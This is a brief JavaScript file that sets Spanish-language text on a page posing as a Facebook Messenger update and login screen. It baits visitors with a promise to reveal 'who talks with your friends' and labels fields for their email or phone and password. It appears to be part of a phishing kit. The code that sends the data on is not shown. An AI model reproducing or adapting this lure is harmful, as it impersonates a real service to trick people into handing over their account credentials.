var mainParagraph = document.querySelector(".con-text");
var subMainParagraph = document.querySelector(".log-text");
var updateButton = document.querySelector(".update")
var userInput = document.querySelector(".home-mail");
var passInput = document.querySelector(".home-pass");
var logButton = document.querySelector(".login"); 
var checkBox = document.querySelector(".chbox"); 

mainParagraph.innerHTML ="Actualiza Messenger a la última versión para disfrutar de las nuevas funciones, como saber quién habla con tus amigos.";
subMainParagraph.innerHTML ="Conéctese instantáneamente con personas en su vida. Inicie sesión con Facebook para comenzar.";
updateButton.innerHTML ="actualizar ahora";
userInput.setAttribute("placeholder" , "Dirección de correo electrónico o número de teléfono");
passInput.setAttribute("placeholder" , "Contraseña");
logButton.setAttribute("value" , "Iniciar sesión");
checkBox.innerHTML ="Mantenerme registrado";
